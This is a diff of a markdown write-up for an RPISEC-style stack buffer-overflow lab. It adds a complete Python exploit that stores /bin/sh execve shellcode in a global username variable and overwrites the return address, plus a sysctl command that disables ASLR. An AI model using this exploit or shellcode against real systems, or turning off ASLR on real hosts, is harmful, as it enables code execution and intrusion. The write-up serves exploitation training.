@@ -122,7 +122,7 @@ We see that the functions probably take the input and do a comparison using the 
 ### Now that we know what the binary does, we can do some tests to find the best path to shellcode, which is the idea of ​​this lab.
 
 
-Following the exploration pattern, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs and see how it is handled.
+Following with what we already know, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs for see how it is handled.
 
 
 ![breakfuncs](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/breakfuncs.png)
@@ -188,3 +188,108 @@ We have our buffer-overflow!
 
 ### Shellcode time
 
+
+There came a time when I tried to put some shellcodes after the return address of the main function but I didn't achieve anything. I was stuck for a while trying different ways and nothing.
+
+Until I asked for help and received tips on a better path to follow.
+
+In the source code, the variable that stores the username is outside the scope of the functions, that is, it is in the global scope. This means that it is in the .data section of the binary and not in the .text section where it is the executable area.
+
+With this we can know that the username variable will not be stored in the stack, but the password variable will. So the tip I received was to store the shellcode in the username variable and overwrite the return address in the password variable. To then "get" the shellcode in the username variable and thus execute it.
+
+
+### Let's go
+
+If we look at the disassembly of the main function we see that the address of the username variable is referenced before being passed to the **fgets** function and then to the **verify_user_name** function.
+
+
+![usernamevar](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/usrnmvar.png)
+
+
+And checking the variable's memory we see the string "rpisec".
+
+
+![usernamevar2](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/usrnmvar2.png)
+
+
+Now knowing the address of the username variable and also how to overwrite the return address, let's write our exploit...
+
+
+```py
+import struct
+
+name = b"rpisec"
+
+# addr a_user_name var that store username + 6 bytes to the shellcode addr
+nameaddr = 0x555555558086
+
+# 88 bytes to overflow
+pattern = b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK"
+
+shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+nm = struct.pack('<Q', nameaddr)
+
+buf = b''
+buf += name		# pass in verify_user_name function
+buf += shellcode        # /bin/sh shellcode
+buf += b'\n'		# break line to align the buffer
+buf += pattern          # buffer to overflow password var
+buf += nm		# addr of shellcode in name var
+
+
+f = open("exp", "wb")
+f.write(buf)
+```
+
+(shellcode source: https://shell-storm.org/shellcode/files/shellcode-806.html)
+
+
+After running the python code it sends the buffer to an "exp" file. And the exploration buffer looks like this:
+
+
+![expfile](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/expfile.png)
+
+
+```sh
+rpisec + shellcode + pattern + addr of shellcode
+```
+
+### Shell time
+
+After running we can see that the shellcode has been stored along with the rpisec string.
+
+
+![shellcode1](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode1.png)
+
+
+Arriving at the ret main we see that the return address was successfully overwritten.
+
+
+![shellcode2](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode2.png)
+
+
+Then we see that the shellcode address has been reached and the shellcode instructions are being executed successfully.
+
+
+![shellcode3](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode3.png)
+
+
+
+With everything ok in GDB, let's run the exploit outside the debugger to get the shell on the machine. For execution outside of gdb to work, it will be necessary to disable ASLR so that the host machine does not randomize memory addresses.
+
+
+```
+$ sudo sysctl kernel.randomize_va_space=0
+```
+
+(disable aslr)
+
+
+Running the binary along with the exploit... we have the shell
+
+
+![pwned](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/pwned.png)
+
+
+It was difficult but it worked. :)
